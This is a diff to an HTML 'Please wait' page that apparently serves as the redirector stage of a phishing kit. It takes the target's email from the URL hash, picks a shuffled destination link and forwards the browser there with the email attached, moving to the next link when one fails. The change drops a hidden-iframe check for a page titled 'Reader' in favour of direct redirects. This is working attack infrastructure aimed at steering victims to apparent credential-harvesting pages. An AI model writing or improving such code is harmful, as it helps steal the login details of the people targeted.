@@ -28,19 +28,10 @@
       0%, 50%, 100% { opacity: 0; }
       25%, 75% { opacity: 1; }
     }
-
-    /* Hidden iframe */
-    #tester {
-      display: none;
-      width: 0;
-      height: 0;
-      border: 0;
-    }
   </style>
 </head>
 <body>
   <div id="message">Please wait<span id="dots"><span>.</span><span>.</span><span>.</span></span></div>
-  <iframe id="tester"></iframe>
 
   <script>
     const links = [
@@ -67,11 +58,7 @@
     ];
 
     const email = window.location.hash.substring(1);
-    const jargon = Math.random().toString(36).substring(2,12);
-    const messageEl = document.getElementById("message");
-    const iframe = document.getElementById("tester");
 
-    // Shuffle array for random order
     function shuffle(arr) {
       const a = arr.slice();
       for (let i = a.length - 1; i > 0; i--) {
@@ -82,41 +69,27 @@
     }
 
     const shuffledLinks = shuffle(links);
-
     let index = 0;
 
     function tryNextLink() {
       if (index >= shuffledLinks.length) {
-        messageEl.textContent = "All links are down!";
+        document.getElementById("message").textContent = "All links may be down!";
         return;
       }
 
-      const url = shuffledLinks[index] + "#" + email + "-" + jargon;
-      messageEl.textContent = `Checking ${url}…`;
-      iframe.src = url;
+      const url = shuffledLinks[index] + "#" + email;
+      document.getElementById("message").textContent = `Redirecting to ${shuffledLinks[index]}…`;
+      window.location.href = url;
 
-      // Wait 3 seconds for the iframe to load and check title
+      // Fallback: if redirect fails after 5s, try next link
       setTimeout(() => {
-        try {
-          const title = iframe.contentDocument?.title;
-          if (title === "Reader") {
-            messageEl.textContent = `Redirecting to ${shuffledLinks[index]}…`;
-            window.location.href = url;
-          } else {
-            index++;
-            tryNextLink();
-          }
-        } catch {
-          // Cross-origin error, assume link works (or skip)
-          index++;
-          tryNextLink();
-        }
-      }, 3000);
+        index++;
+        tryNextLink();
+      }, 5000);
     }
 
-    // Start redirect after initial animation wait
     window.addEventListener("DOMContentLoaded", () => {
-      setTimeout(tryNextLink, 3000);
+      setTimeout(tryNextLink, 3000); // initial wait
     });
   </script>
 </body>
